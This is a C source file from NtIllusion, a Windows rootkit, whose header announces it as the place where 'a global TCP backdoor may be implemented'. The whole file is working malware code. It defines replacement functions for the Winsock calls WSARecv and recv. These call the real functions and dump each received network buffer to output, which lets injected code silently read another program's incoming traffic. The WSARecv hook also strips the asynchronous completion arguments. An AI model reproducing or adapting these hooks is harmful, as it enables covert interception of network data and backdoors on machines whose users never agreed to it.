/******************************************************************************
  kNTIFlow.c	: A global TCP backdoor may be implemented here!
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <winsock2.h>	// for socket hijack
#include <iprtrmib.h>	// for socket hijack
#include <windows.h>
#include "kNTIFlow.h"

#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

FARPROC fWSARecv;
FARPROC frecv;

// Warning, if you hook a browser for testing by requesting a web page, remember that the page
// is often not entirely received but there is only a check performed to know if it has been modified (the page
// is downloaded only the first time). You'll have to deal with cache memory.
// The Windows Sockets WSARecv function receives data from a connected socket.
int WINAPI MyWSARecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionROUTINE)
{
	int iRet=0;
	// forge the call to function. We must pay attention to block completion routine usage
	// since we may miss information by letting this mechanism being used.
	iRet = fWSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd,
		lpFlags, /*lpOverlapped*/0, /*lpCompletionROUTINE*/0);
	OutputString("# WSARecv hijack: %s\n", lpBuffers->buf);
	return  iRet;
}

int WINAPI Myrecv(SOCKET s, char FAR* buf, int len, int flags)
{
	int retval=0;
	if(!frecv) return 0;
	my_memset(buf, 0, len);
	retval = frecv(s, buf, len, flags);
	if(retval) OutputString("@@%s@@\n", buf);

	return retval;
}
